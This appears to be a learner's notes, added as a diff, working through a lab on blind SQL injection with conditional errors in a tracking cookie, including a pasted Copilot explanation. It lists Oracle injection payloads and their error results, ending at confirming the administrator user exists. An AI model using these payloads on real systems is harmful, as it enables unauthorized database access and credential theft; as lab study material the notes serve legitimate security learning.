@@ -1,0 +1,58 @@
+Blind SQL injection with conditional errors - vulnerable parameter tracking cookie
+Goal: Find out the password of the administrator user.
+
+1) Prove parameter is vulnerable
+' -> Error -> Indicates the input is being directly used in a query, breaking the syntax and resulting in an error -> '''
+'' -> No Error -> This input correctly matches the expected syntax -> ''''
+' || (select '') || ' -> Error -> Maybe not MySQL
+' || (select '' from dual) || ' -> No Error -> With Oracle you need a from, dual is a default table
+' || (select '' from nonexistentable) || ' -> Error -> Non existent table
+
+select tracking-id from tracking-table where trackingId = '0IzjMBaRbH8TAJMI'
+select tracking-id from tracking-table where trackingId = '0IzjMBaRbH8TAJMI'' -> Error
+select tracking-id from tracking-table where trackingId = '0IzjMBaRbH8TAJMI''' -> No Error
+select tracking-id from tracking-table where trackingId = '0IzjMBaRbH8TAJMI' + (select '') + '' -> Error, Not MySQL
+select tracking-id from tracking-table where trackingId = '0IzjMBaRbH8TAJMI' + (select '' from dual) + '' -> No Error
+select tracking-id from tracking-table where trackingId = '0IzjMBaRbH8TAJMI' + (select '' from nonexistentable) + '' -> Error -> Non existent table
+--I used + above because I'm used to this for concatenation
+
+2) Confirm users table exists
+' || (select '' from users) || ' -> Error -> '' outputing empty string for each user which might break our query
+' || (select '' from users where rownum=1) || ' -> No Error -> ouput empty string for just one row worked
+
+3) Confirm administrator user exists in the users database
+' || (select '' from users where username='administrator') || '   -> No Error
+' || (select '' from users where username='nonexistentuser') || ' -> No Error
+--Copilot--
+The SQL injection snippets you've provided are designed to concatenate an empty string (`''`) with the results of a subquery.
+The key point here is the use of an empty string as the selection from the `users` table. This approach, indeed, won't produce an
+error regardless of whether the `username` exists or not. Here's why:
+
+1. **Concatenation of Empty Strings**: The outer query concatenates the result of the subquery with empty strings.
+Since the subquery itself selects an empty string, the overall result is just an empty string, irrespective of the subquery's internal result.
+
+2. **Subquery Result**: 
+   - When the subquery `(select '' from users where username='administrator')` is executed, it attempts to select an empty string for each row that matches the condition (`username='administrator'`).
+   - If the `administrator` user exists, the subquery successfully selects an empty string (because that's what you've asked it to select) but doesn't return any user-specific data. The existence of the user doesn't change the output, which is just an empty string.
+   - Similarly, for a `nonexistentuser`, the condition fails to match any rows, but since you're selecting an empty string, the failure to match doesn't manifest as an error; it simply results in no rows being selected, which, when concatenated with the outer empty strings, still results in an empty string.
+
+Outer Empty Strings - The phrase "outer empty strings" refers to the parts of the SQL injection snippet that are outside the subquery, specifically the ' || at the beginning and the || ' at the end. In the context of the SQL injection snippets you provided earlier:
+
+3. **No Error Produced**: SQL doesn't produce an error for a query that successfully executes but returns no rows. The selection of an empty string (`''`) is a valid operation whether or not the condition matches any rows. Therefore, both queries execute without error, making it impossible to infer the existence of the `administrator` user based on the presence or absence of an error.
+
+To determine if a user exists, you would need a different approach that somehow reflects the existence of the user
+in the output or behavior of the query. For example, attempting to extract actual data (like a username)
+that would only be present if the user exists, or causing a deliberate error or noticeable difference in the query's
+execution or result when the user does or does not exist. However, such techniques should be used responsibly and ethically,
+typically in the context of security testing with permission.
+' || (SELECT CASE WHEN EXISTS (SELECT 1 FROM users WHERE username='administrator') THEN 'True' ELSE 'False' END FROM dual) || '
+--Copilot--
+
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' -> No Error
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' -> Error
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '
+-> Error -> Which means Administrator exists -> FROM users where username='administrator' is evaluated first, and because it worked it will do the select case which will cause the divide by 0 error
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='nonexistentuser') || '
+-> No Error -> FROM users where username ='nonexistentuser' evaluted to false which means the select case didn't run
